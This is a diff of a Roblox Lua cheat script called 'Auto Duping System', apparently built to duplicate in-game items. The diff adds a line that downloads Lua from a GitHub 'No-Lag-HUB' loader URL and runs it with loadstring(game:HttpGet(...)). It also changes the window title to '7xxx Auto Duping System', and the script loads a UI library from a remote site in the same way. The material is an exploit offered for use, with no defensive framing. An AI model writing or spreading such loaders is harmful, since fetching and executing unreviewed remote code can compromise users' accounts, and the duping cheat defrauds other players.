@@ -65,7 +65,7 @@ local function executeDupingScript(manualExecute)
     task.delay(0.5, function()
         -- Execute the script
         local success, err = pcall(function()
-            loadstring(game:HttpGet("", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
         end)
         
         -- Only remove screen after full execution time if not manual execute
@@ -87,7 +87,7 @@ end
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "Auto Duping System",
+   Name = "7xxx Auto Duping System",
    LoadingTitle = "Duping Interface",
    LoadingSubtitle = "by 7xxx",
    ConfigurationSaving = {
